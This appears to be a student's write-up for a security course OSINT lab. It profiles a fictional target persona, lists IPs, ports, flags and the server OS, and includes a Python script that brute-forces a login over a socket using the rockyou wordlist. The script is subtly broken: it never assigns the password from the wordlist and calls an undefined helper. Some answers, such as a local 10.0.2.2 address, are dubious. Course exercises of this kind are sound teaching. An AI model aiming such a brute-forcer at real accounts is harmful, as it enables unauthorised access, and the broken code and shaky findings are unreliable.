# Writeup 2 - OSINT

Name: Ramsay Farah
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examniation.

Digital acknowledgement: Ramsay Farah

## Assignment Writeup

### Part 1 (45 pts)

*Please use this space to writeup your answers and solutions (and how you found them!) for part 1.*
1. What is `v0idcache`'s real name?
Her real name is Elizabeth Moffet.

2. Where does `v0idcache` work? What is the URL to their website?
She works at Elite Banking and the URL is 1337bank.money.

3. List all personal information (including social media accounts, contacts, etc) you can find about `v0idcache`. For each, briefly detail how you discovered them.
On her works website, I found her email which is v0idcache@protonmail.com. By using checkusername.com, I was able to see which websites she is logged in on. I found her twitter, which is @v0idcache.

4. List any ( >= 1 ) IP addresses associated with the website. For each, detail the location of the server, any history in DNS, and how you discovered this information.
I found two IPs.
142.93.136.81
10.0.2.2
I found these using a namp on the 1337bank.money.

5. List any hidden files or directories you found on this website. For full credit, list *two* distinct flags.
I found the /secret_directory directory.
-{h1dd3n_1n_plain_5ight}
-{h1ding_fil3s_in_r0bots_L0L}

6. What ports are open on the website? What services are running behind these ports? How did you discover this?
I found two ports through nmapping and one other through scanning through the ports that could be open. They are 22, 80, 1337.
22 has tcp and open ssh
80 has tcp and open http

7. Which operating system is running on the server that is hosting the website? How did you discover this?
By using censys.io I found that the operating system is Ubuntu.

8. **BONUS:** Did you find any other flags on your OSINT mission? (Up to 9 pts!)
{h1d3_s3cret_g1ts}

### Part 2 (75 pts)

*Please use this space to detail your approach and solutions for part 2. Don't forget to upload yourcompleted source code to this /writeup directory as well!*

The way I combatted this problem I broke it into steps. The first step was to be able to access the wordlist and be able to iterate through it. After that was done, I needed to be able to receive the data I was gathering. After getting the data, I needed to send the data to the server. After that, all I had to do is wait for the right password to come appear.

import socket

host = '142.93.136.81' # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            Reading:
                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
            Sending:
                s.send("something to send\n")   # Send a newline \n at the end of your command
        General idea:
            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """

    username = "v0idcache"   # Hint: use OSINT
    password = ""   # Hint: use wordlist
    with open(wordlist) as file:
        for line in file:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            s.recv(1024)
            s.send((username+"\n").encode())
            s.recv(1024)
            s.send((password).encode())
            passwd = byte_to_string(s.recv(1024))
            s.close()
            if(passwd != "Fail" and passwd != ""):
                print("\n\nSUCCESS :: Password [ {} ]\n\n".format(password))
                break




if __name__ == '__main__':
    brute_force()
